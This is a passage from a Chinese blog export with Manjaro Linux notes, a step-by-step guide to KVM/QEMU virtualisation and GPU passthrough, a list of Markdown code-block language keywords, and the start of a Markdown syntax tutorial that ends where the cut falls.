<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gaps inner 15</span><br></pre></td></tr></table></figure>
<p>Super+p 刷新i3配置</p>
<p><strong>快速启动软件的工具</strong></p>
<p>dmenu</p>
<p>Super+s打开</p>
<p><strong>启动i3时启动软件</strong></p>
<p>在配置文件中加入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exec_always 软件名或脚本</span><br></pre></td></tr></table></figure>
<h4 id="deepin桌面"><a href="#deepin桌面" class="headerlink" title="deepin桌面"></a>deepin桌面</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S deepin deepin-extra</span><br><span class="line">sudo pacman -S adobe-source-han-sans-cn-fonts	<span class="comment">##安装思源黑体字库</span></span><br><span class="line"><span class="comment">#思源宋体：adobe-source-han-serif-cn-fonts</span></span><br><span class="line"><span class="comment">#Noto字体：noto-fonts-cjk</span></span><br><span class="line"><span class="comment">#Meslo字体：yay ttf-meslo</span></span><br><span class="line"><span class="comment">#hack字体：ttf-hack</span></span><br></pre></td></tr></table></figure>
<h3 id="自定义命令"><a href="#自定义命令" class="headerlink" title="自定义命令"></a>自定义命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fish</span></span><br><span class="line"><span class="built_in">alias</span> cl clear		<span class="comment"># 自定义命令</span></span><br><span class="line">funcave	c			<span class="comment"># 保存自定义</span></span><br><span class="line"><span class="built_in">alias</span> mv <span class="string">&#x27;mv -i&#x27;</span>	<span class="comment"># 若有同名文件提示是否覆盖</span></span><br><span class="line">funcave	mv</span><br><span class="line"></span><br><span class="line"><span class="comment"># zsh</span></span><br><span class="line">vim ~/.zshrc 		<span class="comment"># 添加内容</span></span><br><span class="line"><span class="built_in">alias</span> cl=<span class="string">&quot;clear&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc 	<span class="comment"># 刷新环境变量</span></span><br></pre></td></tr></table></figure>
<h3 id="wine卸载软件"><a href="#wine卸载软件" class="headerlink" title="wine卸载软件"></a>wine卸载软件</h3><p><strong>直接删除软件目录下的文件即可</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/.wine/drive_c/Program\ Files\ \(x86\)</span><br><span class="line">~/.wine/drive_c/Program\ Files</span><br><span class="line">~/.<span class="built_in">local</span>/share/applications/wine/Programs</span><br><span class="line">~/.config/menus/applications-merged</span><br></pre></td></tr></table></figure>
<p><strong>使用命令卸载</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ....	<span class="comment">#进入软件目录</span></span><br><span class="line">wine uninstall.exe</span><br><span class="line"><span class="comment">#或直接卸载</span></span><br><span class="line">wine uninstall 软件名</span><br></pre></td></tr></table></figure>
<p>卸载后软件图标还在dash中，可到<code>~/Desktop</code>目录下将对应的图标删除</p>
<h3 id="linux有趣命令"><a href="#linux有趣命令" class="headerlink" title="linux有趣命令"></a>linux有趣命令</h3><p><a href="https://zhuanlan.zhihu.com/p/51904179">40个超有趣的Linux命令行彩蛋和游戏</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_43968923/article/details/86662256">Manjaro 常用软件安装</a></p>
<p><a href="https://blog.csdn.net/was172/article/details/82826607">Manjaro常用软件和命令行推荐</a></p>
<p><a href="https://blog.csdn.net/qq_39828850/article/details/87919188">Manjaro NVIDIA驱动问题的解决方案</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>笔记</tag>
        <tag>Manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro部署kvm虚拟机</title>
    <url>/posts/11be7fa2/</url>
    <content><![CDATA[<h1 id="Manjaro部署kvm虚拟机"><a href="#Manjaro部署kvm虚拟机" class="headerlink" title="Manjaro部署kvm虚拟机"></a>Manjaro部署kvm虚拟机</h1><h3 id="检测是否支持kvm"><a href="#检测是否支持kvm" class="headerlink" title="检测是否支持kvm"></a>检测是否支持kvm</h3><h4 id="CPU是否支持虚拟化"><a href="#CPU是否支持虚拟化" class="headerlink" title="CPU是否支持虚拟化"></a>CPU是否支持虚拟化</h4><p>kvm需要宿主机cpu支持虚拟化（inter cpu的<code>VT-x</code>技术、AMD cpu的<code>AMD-v</code>技术）<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -E <span class="string">&quot;(vmx|svm)&quot;</span> --color=always /proc/cpuinfo</span><br></pre></td></tr></table></figure><br>如果输出中有<code>vmx</code> 或者<code>svm</code>就说明支持虚拟化；如果没有任何的输出，说明<strong>未开启CPU虚拟化</strong>(需到BIOS中开启,不同品牌的开启方式都有所不同，网上都会有教程)或<strong>CPU不支持虚拟化</strong>(无缘虚拟机)</p>
<a id="more"></a>
<h4 id="内核是否支持"><a href="#内核是否支持" class="headerlink" title="内核是否支持"></a>内核是否支持</h4><ul>
<li><strong>KVM模块</strong><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zgrep KVM /proc/config.gz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>模块设定是y或m，则该模块可用</p>
</blockquote>
</li>
</ul>
<ul>
<li><strong>VirtIO模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zgrep VIRTIO /proc/config.gz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>准/半虚拟化是在全虚拟化的基础上，把客户操作系统进行了修改，增加了一个专门的API，这个API可以将客户操作系统发出的指令进行最优化。<br>KVM提供Virtio作为hypervisor和来宾之间的一层API。所有的Virtio有两部分组成：主机设备和客户驱动程序<br>模块设定是y或m，则该模块可用</p>
</blockquote>
<ul>
<li><strong>内核模块是否装载</strong><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsmod | grep kvm</span><br><span class="line">lsmod | grep virtio</span><br></pre></td></tr></table></figure>
若没有返回任何信息，说明没有装载，需要自行装载，控制内核模块装载、卸载的命令由<code>kmod</code>软件包提供<ul>
<li>手动装/卸载<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo modprobe virtio				<span class="comment"># 装载内核模块virtio</span></span><br><span class="line">sudo modprobe -r / rmmod virtio		<span class="comment">#卸载内核模块virtio</span></span><br></pre></td></tr></table></figure></li>
<li>开机装载<br>开机时systemd 读取 /etc/modules-load.d/ 中的配置加载额外的内核模块。配置文件名称通常为<code>/etc/modules-load.d/ &lt;-program-&gt; .conf</code> ，配置内容为：一行一个要读取的模块名，而空行以及第一个非空格字符为#或;的行会被忽略<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/modules-load.d/virtio-mod.conf</span><br></pre></td></tr></table></figure>
添加需要的配置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Load virtio-net.ko at boot</span><br><span class="line">virtio				#所有virtio设备</span><br><span class="line">#virtio-net			#网络设备</span><br><span class="line">#virtio-blk      	#块设备</span><br><span class="line">#virtio-scsi     	#控制器设备</span><br><span class="line">#virtio-serial      #串行设备</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>virtio 驱动安装</strong><ul>
<li><a href="https://docs.fedoraproject.org/en-US/quick-docs/creating-windows-virtual-machines-using-virtio-drivers/index.html">下载页面</a>—-&gt;<code>Direct downloads</code>—-&gt;<a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso">Stable（稳定版）</a></li>
</ul>
</li>
</ul>
<p>将镜像挂载到虚拟机对未识别设备进行驱动安装即可</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><strong>KVM在系统内核中，无需安装</strong></p>
<h4 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h4><p>Qemu是一个广泛使用的开源计算机仿真器和虚拟机，当作为仿真器时，可以在一种架构(如PC机)下运行另一种架构(如ARM)下的操作系统和程序。通过动态转化，可以获得很高的运行效率。当 QEME 作为虚拟机时，可以使用 xen 或 kvm 访问 CPU 的扩展功能(HVM)，在主机 CPU 上直接执行虚拟客户端的代码，获得接近于真机的性能表现。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S qemu</span><br></pre></td></tr></table></figure>
<h4 id="安装libvirt"><a href="#安装libvirt" class="headerlink" title="安装libvirt"></a>安装libvirt</h4><p>libvirt是Linux上实现虚拟化功能的库，是长期稳定的C语言API，支持KVM/QEMU、Xen、LXC等主流虚拟化方案</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S libvirt virt-manager 	<span class="comment">#virt-manager为图形前端</span></span><br></pre></td></tr></table></figure>
<h4 id="安装网络组件"><a href="#安装网络组件" class="headerlink" title="安装网络组件"></a>安装网络组件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ebtables dnsmasq bridge-utils openbsd-netcat</span><br></pre></td></tr></table></figure>
<ul>
<li><p>ebtables 桥接网络管理，用于 default NAT 网络</p>
</li>
<li><p>dnsmasq DHCP DNS 服务，用于 default NAT 网络</p>
</li>
<li><p>bridge-utils 桥接网络管理，用于桥接网络</p>
</li>
<li><p>openbsd-netcat 用于通过 SSH 管理</p>
</li>
</ul>
<h4 id="其他可选包"><a href="#其他可选包" class="headerlink" title="其他可选包"></a>其他可选包</h4><ul>
<li>qemu-arch-extra              其它架构支持</li>
<li>qemu-block-gluster          glusterfs block 支持</li>
<li>qemu-block-iscsi          iSCSI block 支持</li>
<li>qemu-block-rbd             RBD block 支持</li>
<li>samba - SMB/CIFS             服务器支持</li>
</ul>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="启动守护进程"><a href="#启动守护进程" class="headerlink" title="启动守护进程"></a>启动守护进程</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start libvirtd    	<span class="comment">#启动libvirtd进程</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> libvirtd   	<span class="comment">#开机自起</span></span><br></pre></td></tr></table></figure>
<h4 id="启动-default-NAT网络"><a href="#启动-default-NAT网络" class="headerlink" title="启动 default NAT网络"></a>启动 default NAT网络</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo virsh net-start default</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#出现错误可列出网络检查</span></span><br><span class="line">sudo virsh net-list --all</span><br><span class="line"><span class="comment">#若没有任何网络，可手动定义网络；或有网络但ifconfig中没有，且启动错误也可手动添加</span></span><br><span class="line">sudo virsh net-define /etc/libvirt/qemu/networks/default.xml</span><br><span class="line"><span class="comment">#标记为自动启动</span></span><br><span class="line">sudo virsh net-autostart default</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/weixin_36820871/article/details/80595855">产考</a></p>
<h4 id="将用户添加到kvm用户组"><a href="#将用户添加到kvm用户组" class="headerlink" title="将用户添加到kvm用户组"></a>将用户添加到kvm用户组</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start libvirtd    	#启动libvirtd进程</span><br><span class="line">systemctl enable libvirtd   	#开机自起</span><br></pre></td></tr></table></figure>
<p>将用户添加到kvm用户组<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -a -G kvm user_name</span><br></pre></td></tr></table></figure></p>
<h3 id="安装UEFI功能"><a href="#安装UEFI功能" class="headerlink" title="安装UEFI功能"></a>安装UEFI功能</h3><h4 id="安装UEFI固件"><a href="#安装UEFI固件" class="headerlink" title="安装UEFI固件"></a>安装UEFI固件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ovmf</span><br></pre></td></tr></table></figure>
<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>配置<code>libvirtd</code>启用<code>UEFI</code>,<code>libvirt</code>需要知道<code>UEFI</code>—&gt;<code>NVRAM</code>中的配置文件映射<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/libvirt/qemu.conf</span><br></pre></td></tr></table></figure><br>找到<code>nvram = [ ]</code>去掉注释，默认的配置文件中NVRAM配置的是<code>ovmf_code.fd</code>文件的路径<br>查看<code>/usr/share/ovmf/x64/</code>目录下的内容对其进行配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nvram &#x3D; [</span><br><span class="line">   &quot;&#x2F;usr&#x2F;share&#x2F;ovmf&#x2F;x64&#x2F;OVMF_CODE.fd:&#x2F;usr&#x2F;share&#x2F;ovmf&#x2F;x64&#x2F;OVMF_CODE.fd&quot;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>重启<code>libvirtd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart libvirtd</span><br></pre></td></tr></table></figure>
<h3 id="显卡直通-（未成功，待研究）"><a href="#显卡直通-（未成功，待研究）" class="headerlink" title="显卡直通 （未成功，待研究）"></a>显卡直通<font color="red"> （未成功，待研究）</font></h3><p><strong>可能踩坑</strong>：<strong>安装了显卡闭源驱动</strong></p>
<h4 id="通过OVMF实现PCI直通"><a href="#通过OVMF实现PCI直通" class="headerlink" title="通过OVMF实现PCI直通"></a>通过OVMF实现PCI直通</h4><p><strong>启用IOMMU</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br><span class="line"><span class="comment">#修改GRUB_CMDLINE_LINUX=&quot;&quot;</span></span><br><span class="line"><span class="comment">#Intel CPU(VT-d)，使用 intel_iommu=on。</span></span><br><span class="line"><span class="comment">#AMD CPU(AMD-Vi)，使用 amd_iommu=on</span></span><br><span class="line"><span class="comment">#iommu=pt 防止Linux试图接触(touching)无法直通的设备</span></span><br><span class="line">GRUB_CMDLINE_LINUX=<span class="string">&quot;intel_iommu=on iommu=pt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更新grub文件</span></span><br><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure>
<p>重启后检查dmesg 以确认 IOMMU 已经被正确启用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg | grep -e DMAR -e IOMMU</span><br></pre></td></tr></table></figure>
<p><strong>确保PCI设备被分配到IOMMU组中</strong></p>
<p>创建脚本执行输出PCI 设备是如何被分配到 IOMMU 组之中的，如果没有任何输出，代表没有启用IOMMU支持或你的硬件不支持IOMMU</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">shopt</span> -s nullglob</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> /sys/kernel/iommu_groups/*/devices/*; <span class="keyword">do</span> </span><br><span class="line">    n=<span class="variable">$&#123;d#*/iommu_groups/*&#125;</span>; n=<span class="variable">$&#123;n%%/*&#125;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;IOMMU Group %s &#x27;</span> <span class="string">&quot;<span class="variable">$n</span>&quot;</span></span><br><span class="line">    lspci -nns <span class="string">&quot;<span class="variable">$&#123;d##*/&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure>
<p><strong>隔离GPU</strong></p>
<p>Linux 4.1 开始，内核包括了 <code>vfio-pci</code> 。这是一个 VFIO 驱动程序，与 <code>pci-stub</code> 的作用相同。但它可以在一定程度上控制设备，例如在不使用设备的时候将它们切换到 D3 状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">modinfo vfio-pci</span><br></pre></td></tr></table></figure>
<p>查看显卡信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./iommu.sh|grep NVIDIA</span><br><span class="line"></span><br><span class="line">IOMMU Group 11 01:00.0 3D controller [0302]: NVIDIA Corporation GM108M [GeForce 940MX] [10de:134d] (rev a2)</span><br><span class="line"><span class="comment">#ID: 10de:134d</span></span><br><span class="line"><span class="comment">#01:00.0</span></span><br><span class="line"></span><br><span class="line">cat /sys/bus/pci/devices/0000:01:00.0/modalias</span><br><span class="line"><span class="comment">#pci:v000010DEd0000134Dsv00001025sd00001133bc03sc02i00</span></span><br></pre></td></tr></table></figure>
<p>加载<code>vfio-pci</code>并将ID参数传递给内核，<strong>如果有与该显卡同组（IOMMU Group 11）的设备也要将ID加进去</strong></p>
<p>可通过命令：<code>find /sys/kernel/iommu_groups/ -type l</code>查询同组设备</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/modprobe.d/vfio.conf</span><br><span class="line"><span class="comment">#加入内容，多个ID用 , 分隔</span></span><br><span class="line"><span class="built_in">alias</span> pci:v000010DEd0000134Dsv00001025sd00001133bc03sc02i00 vfio-pci</span><br><span class="line">options vfio-pci ids=10de:134d</span><br></pre></td></tr></table></figure>
<p>保证<code>vfio-pci</code>在其他图形驱动之前加载，在initramfs中静态绑定它和它的依赖项。按照<code>vfio_pci</code>，<code>vfio</code>，<code>vfio_iommu_type1</code>，<code>vfio_virqfd</code> 的顺序添加到mkinitcpio。</p>
<p>确保<code>modconf hook</code>在<code>mkinitcpio.conf</code>的 HOOKS 列表中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/mkinitcpio.conf</span><br><span class="line"><span class="comment">#找到MODULES修改相关参数顺序</span></span><br><span class="line">MODULES=(... vfio_pci vfio vfio_iommu_type1 vfio_virqfd ...)</span><br><span class="line"><span class="comment">#找到HOOKS确保有参数modconf</span></span><br><span class="line">HOOKS=(... modconf ...)</span><br></pre></td></tr></table></figure>
<p>重新生成<code>initramfs</code></p>
<p>生成<code>initramfs</code>映像<code>/etc/mkinitcpio.conf</code>并将其保存<code>/boot/linux-custom.img</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkinitcpio -c /etc/mkinitcpio.conf -g /boot/linux-custom.img -k 4.19.69-1-MANJARO</span><br></pre></td></tr></table></figure>
<p>如果修改了<code>/etc/modprobe.d/vfio.conf</code>中的设备ID，就需要重新生成<code>initramfs</code></p>
<p>重启验证<code>vfio-pci</code>是否已经正确加载并绑定到正确的设备</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg | grep -i vfio</span><br><span class="line"><span class="comment">#有设备且为ffffffff:ffffffff</span></span><br><span class="line"><span class="comment">#vfio_pci: add [10de:134d[ffffffff:ffffffff]] class 0x000000/00000000</span></span><br></pre></td></tr></table></figure>
<p><code>vfio.conf</code>中所绑定的设备（甚至是需要直通的设备）并不一定会出现在 dmesg 的输出之中。有时尽管设备没有出现在 dmesg 的输出中，但实际上在虚拟机中可以被使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lspci -nnk -d 10de:134d</span><br></pre></td></tr></table></figure>
<p><strong>填坑</strong>：解除<code>vfio</code>绑定：还原修改，从新生成<code>initramfs</code> （<code>sudo mkinitcpio -g /boot/initramfs-linux-lily.img -k 4.19.69-1-MANJARO</code>）</p>
<p><a href="https://wiki.archlinux.org/index.php/PCI_passthrough_via_OVMF_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">产考</a>)</p>
<h3 id="使用虚拟机"><a href="#使用虚拟机" class="headerlink" title="使用虚拟机"></a>使用虚拟机</h3><h4 id="图形化方式使用"><a href="#图形化方式使用" class="headerlink" title="图形化方式使用"></a>图形化方式使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">virt-manager</span><br></pre></td></tr></table></figure>
<h4 id="命令方式"><a href="#命令方式" class="headerlink" title="命令方式"></a>命令方式</h4><p><strong>创建磁盘镜像</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-img create -f qcow2 test.qcow2 40G 	<span class="comment"># 动态大小</span></span><br><span class="line">qemu-img create -f raw test.raw 40G 		<span class="comment"># 直接分配大小</span></span><br></pre></td></tr></table></figure><br><strong>创建虚拟机</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vir-install \</span><br><span class="line">--name win \</span><br><span class="line">--ram 1024 \</span><br><span class="line">--vcpu 2 \</span><br><span class="line">-f test.qcow2 \</span><br><span class="line">--cdrom win.iso \</span><br><span class="line">--network bridge=cloudbr0 \</span><br><span class="line">--graphics vnc,listen=0.0.0.0,port=5959,password=<span class="string">&#x27;123456&#x27;</span>,keymap=<span class="string">&#x27;en-us&#x27;</span> \</span><br><span class="line">--force --autostart</span><br></pre></td></tr></table></figure><br>—name         虚拟机名<br>—ram         内存<br>—vcpu         CPU数<br>—f         磁盘镜像<br>—cdrom     安装镜像<br>—network     网路<br>—graphics     连接方式</p>
<p>产考：<a href="https://www.liuzhixiang.com/2019/05/18/Using-KVM-on-Arch%20(Manjaro">在 Arch Linux (Manjaro) 中使用 KVM 虚拟机</a>/)</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Manjaro</tag>
        <tag>kvm</tag>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown代码块支持的语言</title>
    <url>/posts/6ab127e3/</url>
    <content><![CDATA[<div class="table-container">
<table>
<thead>
<tr>
<th>名称</th>
<th>关键字</th>
<th>调用的js</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>AppleScript</td>
<td>applescript</td>
<td>shBrushAppleScript.js</td>
<td></td>
</tr>
<tr>
<td>ActionScript 3.0</td>
<td>actionscript3 , as3</td>
<td>shBrushAS3.js</td>
<td></td>
</tr>
<tr>
<td>Shell</td>
<td>bash , shell</td>
<td>shBrushBash.js</td>
<td></td>
</tr>
<tr>
<td>ColdFusion</td>
<td>coldfusion , cf</td>
<td>shBrushColdFusion.js</td>
<td></td>
</tr>
<tr>
<td>C</td>
<td>cpp , c</td>
<td>shBrushCpp.js</td>
<td></td>
</tr>
<tr>
<td>C#</td>
<td>c# , c-sharp , csharp</td>
<td>shBrushCSharp.js</td>
<td></td>
</tr>
<tr>
<td>CSS</td>
<td>css</td>
<td>shBrushCss.js</td>
<td></td>
</tr>
<tr>
<td>Delphi</td>
<td>delphi , pascal , pas</td>
<td>shBrushDelphi.js</td>
<td></td>
</tr>
<tr>
<td>diff&amp;patch</td>
<td>diff patch</td>
<td>shBrushDiff.js</td>
<td>代码版本冲突差异</td>
</tr>
<tr>
<td>Erlang</td>
<td>erl , erlang</td>
<td>shBrushErlang.js</td>
<td></td>
</tr>
<tr>
<td>Groovy</td>
<td>groovy</td>
<td>shBrushGroovy.js</td>
<td></td>
</tr>
<tr>
<td>Java</td>
<td>java</td>
<td>shBrushJava.js</td>
<td></td>
</tr>
<tr>
<td>JavaFX</td>
<td>jfx , javafx</td>
<td>shBrushJavaFX.js</td>
<td></td>
</tr>
<tr>
<td>JavaScript</td>
<td>js , jscript , javascript</td>
<td>shBrushJScript.js</td>
<td></td>
</tr>
<tr>
<td>Perl</td>
<td>perl , pl , Perl</td>
<td>shBrushPerl.js</td>
<td></td>
</tr>
<tr>
<td>PHP</td>
<td>php</td>
<td>shBrushPhp.js</td>
<td></td>
</tr>
<tr>
<td>text</td>
<td>text , plain</td>
<td>shBrushPlain.js</td>
<td>普通文本</td>
</tr>
<tr>
<td>Python</td>
<td>py , python</td>
<td>shBrushPython.js</td>
<td></td>
</tr>
<tr>
<td>Ruby</td>
<td>ruby , rails , ror , rb</td>
<td>shBrushRuby.js</td>
<td></td>
</tr>
<tr>
<td>SASS&amp;SCSS</td>
<td>sass , scss</td>
<td>shBrushSass.js</td>
<td></td>
</tr>
<tr>
<td>Scala</td>
<td>scala</td>
<td>shBrushScala.js</td>
<td></td>
</tr>
<tr>
<td>SQL</td>
<td>sql</td>
<td>shBrushSql.js</td>
<td></td>
</tr>
<tr>
<td>Visual Basic</td>
<td>vb , vbnet</td>
<td>shBrushVb.js</td>
<td></td>
</tr>
<tr>
<td>XML</td>
<td>xml , xhtml , xslt , html</td>
<td>shBrushXml.js</td>
<td></td>
</tr>
<tr>
<td>Objective C</td>
<td>objc , obj-c</td>
<td>shBrushObjectiveC.js</td>
<td></td>
</tr>
<tr>
<td>F#</td>
<td>f# f-sharp , fsharp</td>
<td>shBrushFSharp.js</td>
<td></td>
</tr>
<tr>
<td></td>
<td>xpp , dynamics-xpp</td>
<td>shBrushDynamics.js</td>
<td></td>
</tr>
<tr>
<td>R</td>
<td>r , s , splus</td>
<td>shBrushR.js</td>
<td></td>
</tr>
<tr>
<td>matlab</td>
<td>matlab</td>
<td>shBrushMatlab.js</td>
<td></td>
</tr>
<tr>
<td>swift</td>
<td>swift</td>
<td>shBrushSwift.js</td>
<td></td>
</tr>
<tr>
<td>GO</td>
<td>go , golang</td>
<td>shBrushGo.js</td>
</tr>
</tbody>
</table>
</div>
<p><strong>diff</strong>:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">test</span><br><span class="line"><span class="deletion">- test</span></span><br><span class="line"><span class="addition">+ test</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown语法</title>
    <url>/posts/3c50d03d/</url>
    <content><![CDATA[<p><span id="a">顶部</span></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Markdown是一种纯文本格式的标记语言。通过简单的标记语法，它可以使普通文本内容具有一定的格式。<br>Markdown 的目标是实现「易读易写」<br>Markdown 语法的目标是：成为一种适用于网络的书写语言。<br>Markdown 可直接在文档中使用HTML的标签实</p>
<p><code>.md</code>文件即为Markdown文件，现在很多前端项目中的readme等文件都是用Markdown编写的，很多企业也鼓励使用这种文件</p>
<p>下面讲解Markdown文件的基础语法,<a href="https://markdown-zh.readthedocs.io/en/latest/">详细参考</a></p>
<a id="more"></a>
<h1 id="Markdown基础语法"><a href="#Markdown基础语法" class="headerlink" title="Markdown基础语法"></a>Markdown基础语法</h1><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>前面带#号，后面带文字；一二级标签下面会有一条横线</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">## 二级标题</span></span><br><span class="line"><span class="section">### 三级标题</span></span><br><span class="line"><span class="section">#### 四级标题</span></span><br><span class="line"><span class="section">##### 五级标题</span></span><br><span class="line"><span class="section">###### 六级标题</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr>
<h1 id="文本格式"><a href="#文本格式" class="headerlink" title="文本格式"></a>文本格式</h1><h2 id="强调字体"><a href="#强调字体" class="headerlink" title="强调字体"></a>强调字体</h2><p>一个星号（<code>*</code>）或者是一个下划线（<code>_</code>）包起来，会转换为\<em>倾斜，如果是2个，会转换为\<strong>加粗</strong></em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="emphasis">*md*</span>    </span><br><span class="line"><span class="strong">**md**</span></span><br><span class="line"><span class="emphasis">_md_</span>   </span><br><span class="line"> <span class="strong">__md__</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p><em>md</em><br><strong>md</strong><br><em>md</em><br> <strong>md</strong></p>
<hr>
<h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><p>基本上和js转义一样,\接需要转义的字符<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\\</span><br><span class="line">\*</span><br><span class="line">\+</span><br><span class="line">\-</span><br><span class="line">\`</span><br><span class="line">\_</span><br></pre></td></tr></table></figure></p>
<hr>
<p><strong>效果</strong>：<br>\<br>*<br>+<br>-<br>`<br>_</p>
<hr>
<h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h2><p>用<code>~~</code>把需要显示删除线的字符包裹起来</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">~~删除~~</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p><del>删除</del></p>
<hr>
<h2 id="字体、字号、颜色"><a href="#字体、字号、颜色" class="headerlink" title="字体、字号、颜色"></a>字体、字号、颜色</h2><p>Markdown本身不能设置这些，需要结合HTML标签来完成</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>我是黑体字<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;微软雅黑&quot;</span>&gt;</span></span>我是微软雅黑<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;STCAIYUN&quot;</span>&gt;</span></span>我是华文彩云<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#ff0000</span> <span class="attr">size</span>=<span class="string">12</span> <span 